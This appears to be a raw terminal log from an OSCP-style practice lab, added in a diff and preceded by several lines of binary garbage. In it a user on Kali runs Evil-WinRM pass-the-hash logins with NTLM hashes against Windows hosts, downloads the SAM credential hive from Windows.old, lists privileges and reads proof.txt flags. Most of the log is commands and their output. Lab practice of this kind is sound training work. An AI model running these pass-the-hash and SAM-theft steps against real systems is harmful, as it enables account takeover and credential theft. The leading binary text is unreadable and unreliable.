+                                      ,Š”=M˜~qe¤rœèN%X‚N :k‡î0©gnVÅòÊ;%äk°ãÆçŒÅÌW­Þ:Í²žñÉ‘çuB¥g;&y
+êÕ¬ŸNübXÛL6/ºM‹ªzøìõUì2-:¿âº»ƒ°C­ÖrŸ2ÂÐÅçs&æ¿>çtA÷ öž'œs7Ž`^]
+ÈÅ˜a"éÙÉJ\i—ñƒN[Dj}]ã#[þ/–ðâÖÐè¹uÁ¸Û‘´&Ê²;MÛÂ$Ê‡ÆœežØj{6{X=¤é¾®åê7!U›7ý+sh­0ÌO½JPZW£”Ih™rC6º’ŸÏº¢«–0©ž„P|
+¶MRd}A¹]iP™°ËV€§}:ÒxÔz3„š¯†~²»ž5
+ðøüwê|±º§Îyë]"R
+ê0ÕöîAÝ«0ÑˆzÖ
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> download C:\Windows.old\Windows\System32\SAM
+[34mInfo: Downloading C:\Users\celia.almeda\C:Windows.oldWindowsSystem32SAM to C:Windows.oldWindowsSystem32SA
+M[39m
+[31mError: Download failed. Check filenames or paths[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> exit
+[34mInfo: Exiting with code 0[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m rm SAM
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 10.10.192.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents> download C:\Windows.old\Windows\System32\SAM
+[34mInfo: Downloading C:\Users\celia.almeda\Documents\C:Windows.oldWindowsSystem32SAM to C:Windows.oldWindows
+System32SAM[39m
+[31mError: Download failed. Check filenames or paths[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents> download C:/Windows.old/Windows/System32/SAM
+[34mInfo: Downloading C:/Windows.old/Windows/System32/SAM to SAM[39m
+[34mInfo: Download successful![39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda\Documents> exit
+[34mInfo: Exiting with code 0[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 10.10.192.140 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\tom_admin\Documents> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                            Description
+    State
+========================================= ===============================================================
+=== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process
+    Enabled
+SeMachineAccountPrivilege                 Add workstations to domain
+    Enabled
+SeSecurityPrivilege                       Manage auditing and security log
+    Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects
+    Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers
+    Enabled
+SeSystemProfilePrivilege                  Profile system performance
+    Enabled
+SeSystemtimePrivilege                     Change the system time
+    Enabled
+SeProfileSingleProcessPrivilege           Profile single process
+    Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority
+    Enabled
+SeCreatePagefilePrivilege                 Create a pagefile
+    Enabled
+SeBackupPrivilege                         Back up files and directories
+    Enabled
+SeRestorePrivilege                        Restore files and directories
+    Enabled
+SeShutdownPrivilege                       Shut down the system
+    Enabled
+SeDebugPrivilege                          Debug programs
+    Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values
+    Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking
+    Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system
+    Enabled
+SeUndockPrivilege                         Remove computer from docking station
+    Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation
+    Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks
+    Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication
+    Enabled
+SeCreateGlobalPrivilege                   Create global objects
+    Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set
+    Enabled
+SeTimeZonePrivilege                       Change the time zone
+    Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links
+    Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same sess
+ion Enabled
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\tom_admin\Documents> cd ../
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\tom_admin> dir Desktop
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\tom_admin> type C:\Users\Administrator\Dekstop\proof.txt
+Cannot find path 'C:\Users\Administrator\Dekstop\proof.txt' because it does not exist.
+At line:1 char:1
++ type C:\Users\Administrator\Dekstop\proof.txt
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Dekstop\proof.txt:String) [Get-Cont
+ent], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\tom_admin> cd C:\Users\
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> dir
+    Directory: C:\Users
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/12/2022   8:38 AM                Administrator
+d-r---        3/25/2022   7:53 AM                Public
+d-----        3/28/2026   9:24 AM                tom_admin
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> dir Administrator
+    Directory: C:\Users\Administrator
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        3/25/2022   7:28 AM                3D Objects
+d-r---        3/25/2022   7:28 AM                Contacts
+d-r---         4/5/2022   5:31 AM                Desktop
+d-r---         4/6/2022  12:49 AM                Documents
+d-r---        3/25/2022   7:28 AM                Downloads
+d-r---        3/25/2022   7:28 AM                Favorites
+d-r---        3/25/2022   7:28 AM                Links
+d-r---        3/25/2022   7:28 AM                Music
+d-r---        3/25/2022   7:28 AM                Pictures
+d-r---        3/25/2022   7:28 AM                Saved Games
+d-r---        3/25/2022   7:28 AM                Searches
+d-r---        3/25/2022   7:28 AM                Videos
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> dir Administrator\Desktop
+    Directory: C:\Users\Administrator\Desktop
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/28/2026   7:40 AM             34 proof.txt
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> type Administrator\Desktop\proof.txt
+ace2171f07ce0468882133d65cd7bae6
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users>
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> ipconfig
+Windows IP Configuration
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 10.10.192.140
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.192.254
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> type C:\Users\Administrator\Desktop\proof.txt
+ace2171f07ce0468882133d65cd7bae6
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> exit
+s^C
+[1m[33mWarning: Press "y" to exit, press any other key to continue[0m
+[34mInfo: Exiting...[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m evil-winrm -i 10.10.192.142 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
+[34mEvil-WinRM shell v3.9[39m
+[1m[33mWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_
+proc' for module Reline[0m
+[35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-pat
+h-completion[39m
+[34mInfo: Establishing connection to remote endpoint[39m
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\tom_admin\Documents> cd C:\Users\Administrator\
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator> dir desktop
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator> cd C:\tom_admin\Dekstop
+Cannot find path 'C:\tom_admin\Dekstop' because it does not exist.
+At line:1 char:1
++ cd C:\tom_admin\Dekstop
++ ~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\tom_admin\Dekstop:String) [Set-Location], ItemNotFoundE
+xception
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator> cd C:\tom_admin\Desktop
+Cannot find path 'C:\tom_admin\Desktop' because it does not exist.
+At line:1 char:1
++ cd C:\tom_admin\Desktop
++ ~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\tom_admin\Desktop:String) [Set-Location], ItemNotFoundE
+xception
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator> cd C:\Users
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> dir
+    Directory: C:\Users
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/12/2022   8:31 AM                Administrator
+d-----        11/14/2022   6:35 AM                Administrator.OSCP
+d-----         3/28/2026   8:30 AM                celia.almeda
+d-r---        11/18/2020  11:48 PM                Public
+d-----         3/28/2026   9:32 AM                tom_admin
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> cd Administrator.OSCP
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator.OSCP> dir
+    Directory: C:\Users\Administrator.OSCP
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---        11/14/2022   6:32 AM                3D Objects
+d-r---        11/14/2022   6:32 AM                Contacts
+d-r---        11/14/2022   6:32 AM                Desktop
+d-r---        11/14/2022   6:32 AM                Documents
+d-r---        11/14/2022   6:32 AM                Downloads
+d-r---        11/14/2022   6:32 AM                Favorites
+d-r---        11/14/2022   6:32 AM                Links
+d-r---        11/14/2022   6:32 AM                Music
+d-r---        11/14/2022   6:35 AM                OneDrive
+d-r---        11/14/2022   6:33 AM                Pictures
+d-r---        11/14/2022   6:32 AM                Saved Games
+d-r---        11/14/2022   6:33 AM                Searches
+d-r---          2/3/2025  12:04 PM                Videos
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator.OSCP> dir Desktop
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\Administrator.OSCP> cd ../
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> dir
+    Directory: C:\Users
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/12/2022   8:31 AM                Administrator
+d-----        11/14/2022   6:35 AM                Administrator.OSCP
+d-----         3/28/2026   8:30 AM                celia.almeda
+d-r---        11/18/2020  11:48 PM                Public
+d-----         3/28/2026   9:32 AM                tom_admin
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> Get-ChildItem -Path C:\Users -Recurse -Include *.txt
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> Get-ChildItem -Path C:\ -Recurse -Include proof.txt,local.txt
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users> exit
+[34mInfo: Exiting with code 0[39m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/OSCP_A/AD/Loot[0m]
+└─[1m[34m$[0m exit
